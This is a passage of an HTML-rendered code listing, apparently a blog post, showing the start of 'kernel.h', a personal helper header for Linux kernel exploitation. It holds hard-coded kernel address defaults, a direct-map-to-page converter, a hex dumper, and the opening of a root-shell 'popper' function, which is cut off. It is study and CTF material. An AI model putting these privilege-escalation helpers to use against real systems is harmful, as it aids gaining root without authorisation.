class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br><span class="line">848</span><br><span class="line">849</span><br><span class="line">850</span><br><span class="line">851</span><br><span class="line">852</span><br><span class="line">853</span><br><span class="line">854</span><br><span class="line">855</span><br><span class="line">856</span><br><span class="line">857</span><br><span class="line">858</span><br><span class="line">859</span><br><span class="line">860</span><br><span class="line">861</span><br><span class="line">862</span><br><span class="line">863</span><br><span class="line">864</span><br><span class="line">865</span><br><span class="line">866</span><br><span class="line">867</span><br><span class="line">868</span><br><span class="line">869</span><br><span class="line">870</span><br><span class="line">871</span><br><span class="line">872</span><br><span class="line">873</span><br><span class="line">874</span><br><span class="line">875</span><br><span class="line">876</span><br><span class="line">877</span><br><span class="line">878</span><br><span class="line">879</span><br><span class="line">880</span><br><span class="line">881</span><br><span class="line">882</span><br><span class="line">883</span><br><span class="line">884</span><br><span class="line">885</span><br><span class="line">886</span><br><span class="line">887</span><br><span class="line">888</span><br><span class="line">889</span><br><span class="line">890</span><br><span class="line">891</span><br><span class="line">892</span><br><span class="line">893</span><br><span class="line">894</span><br><span class="line">895</span><br><span class="line">896</span><br><span class="line">897</span><br><span class="line">898</span><br><span class="line">899</span><br><span class="line">900</span><br><span class="line">901</span><br><span class="line">902</span><br><span class="line">903</span><br><span class="line">904</span><br><span class="line">905</span><br><span class="line">906</span><br><span class="line">907</span><br><span class="line">908</span><br><span class="line">909</span><br><span class="line">910</span><br><span class="line">911</span><br><span class="line">912</span><br><span class="line">913</span><br><span class="line">914</span><br><span class="line">915</span><br><span class="line">916</span><br><span class="line">917</span><br><span class="line">918</span><br><span class="line">919</span><br><span class="line">920</span><br><span class="line">921</span><br><span class="line">922</span><br><span class="line">923</span><br><span class="line">924</span><br><span class="line">925</span><br><span class="line">926</span><br><span class="line">927</span><br><span class="line">928</span><br><span class="line">929</span><br><span class="line">930</span><br><span class="line">931</span><br><span class="line">932</span><br><span class="line">933</span><br><span class="line">934</span><br><span class="line">935</span><br><span class="line">936</span><br><span class="line">937</span><br><span class="line">938</span><br><span class="line">939</span><br><span class="line">940</span><br><span class="line">941</span><br><span class="line">942</span><br><span class="line">943</span><br><span class="line">944</span><br><span class="line">945</span><br><span class="line">946</span><br><span class="line">947</span><br><span class="line">948</span><br><span class="line">949</span><br><span class="line">950</span><br><span class="line">951</span><br><span class="line">952</span><br><span class="line">953</span><br><span class="line">954</span><br><span class="line">955</span><br><span class="line">956</span><br><span class="line">957</span><br><span class="line">958</span><br><span class="line">959</span><br><span class="line">960</span><br><span class="line">961</span><br><span class="line">962</span><br><span class="line">963</span><br><span class="line">964</span><br><span class="line">965</span><br><span class="line">966</span><br><span class="line">967</span><br><span class="line">968</span><br><span class="line">969</span><br><span class="line">970</span><br><span class="line">971</span><br><span class="line">972</span><br><span class="line">973</span><br><span class="line">974</span><br><span class="line">975</span><br><span class="line">976</span><br><span class="line">977</span><br><span class="line">978</span><br><span class="line">979</span><br><span class="line">980</span><br><span class="line">981</span><br><span class="line">982</span><br><span class="line">983</span><br><span class="line">984</span><br><span class="line">985</span><br><span class="line">986</span><br><span class="line">987</span><br><span class="line">988</span><br><span class="line">989</span><br><span class="line">990</span><br><span class="line">991</span><br><span class="line">992</span><br><span class="line">993</span><br><span class="line">994</span><br><span class="line">995</span><br><span class="line">996</span><br><span class="line">997</span><br><span class="line">998</span><br><span class="line">999</span><br><span class="line">1000</span><br><span class="line">1001</span><br><span class="line">1002</span><br><span class="line">1003</span><br><span class="line">1004</span><br><span class="line">1005</span><br><span class="line">1006</span><br><span class="line">1007</span><br><span class="line">1008</span><br><span class="line">1009</span><br><span class="line">1010</span><br><span class="line">1011</span><br><span class="line">1012</span><br><span class="line">1013</span><br><span class="line">1014</span><br><span class="line">1015</span><br><span class="line">1016</span><br><span class="line">1017</span><br><span class="line">1018</span><br><span class="line">1019</span><br><span class="line">1020</span><br><span class="line">1021</span><br><span class="line">1022</span><br><span class="line">1023</span><br><span class="line">1024</span><br><span class="line">1025</span><br><span class="line">1026</span><br><span class="line">1027</span><br><span class="line">1028</span><br><span class="line">1029</span><br><span class="line">1030</span><br><span class="line">1031</span><br><span class="line">1032</span><br><span class="line">1033</span><br><span class="line">1034</span><br><span class="line">1035</span><br><span class="line">1036</span><br><span class="line">1037</span><br><span class="line">1038</span><br><span class="line">1039</span><br><span class="line">1040</span><br><span class="line">1041</span><br><span class="line">1042</span><br><span class="line">1043</span><br><span class="line">1044</span><br><span class="line">1045</span><br><span class="line">1046</span><br><span class="line">1047</span><br><span class="line">1048</span><br><span class="line">1049</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @file kernel.h</span></span><br><span class="line"><span class="comment"> * @author arttnba3 (arttnba@gmail.com)</span></span><br><span class="line"><span class="comment"> * @brief arttnba3&#x27;s personal utils for kernel pwn</span></span><br><span class="line"><span class="comment"> * @version 1.1</span></span><br><span class="line"><span class="comment"> * @date 2023-05-20</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @copyright Copyright (c) 2023 arttnba3</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> A3_KERNEL_PWN_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> A3_KERNEL_PWN_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> _GNU_SOURCE</span></span><br><span class="line">  <span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/if_packet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/if_ether.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * I - fundamental functions</span></span><br><span class="line"><span class="comment"> * e.g. CPU-core binder, user-status saver, etc.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> kernel_base = <span class="number">0xffffffff81000000</span>, kernel_offset = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> page_offset_base = <span class="number">0xffff888000000000</span>, vmemmap_base = <span class="number">0xffffea0000000000</span>;</span><br><span class="line"><span class="keyword">size_t</span> init_task, init_nsproxy, init_cred;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">direct_map_addr_to_page_addr</span><span class="params">(<span class="keyword">size_t</span> direct_map_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> page_count;</span><br><span class="line"></span><br><span class="line">    page_count = ((direct_map_addr &amp; (~<span class="number">0xfff</span>)) - page_offset_base) / <span class="number">0x1000</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> vmemmap_base + page_count * <span class="number">0x40</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">print_hex</span><span class="params">(<span class="keyword">void</span> *p, <span class="keyword">int</span> size)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *buf = (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(size % <span class="keyword">sizeof</span>(<span class="keyword">void</span> *))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;--------------------------------------------------------------------------------\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; size; i += <span class="keyword">sizeof</span>(<span class="keyword">void</span> *))&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%04x :  %02X %02X %02X %02X %02X %02X %02X %02X     0x%lx\n&quot;</span>, </span><br><span class="line">                i, buf[i+<span class="number">0</span>], buf[i+<span class="number">1</span>], buf[i+<span class="number">2</span>], buf[i+<span class="number">3</span>], buf[i+<span class="number">4</span>], buf[i+<span class="number">5</span>], buf[i+<span class="number">6</span>], buf[i+<span class="number">7</span>], *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)&amp;buf[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">err_exit</span><span class="params">(<span class="keyword">char</span> *msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* root checker and shell poper */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_root_shell</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Checking for root...&quot;</span>);</span><br><span 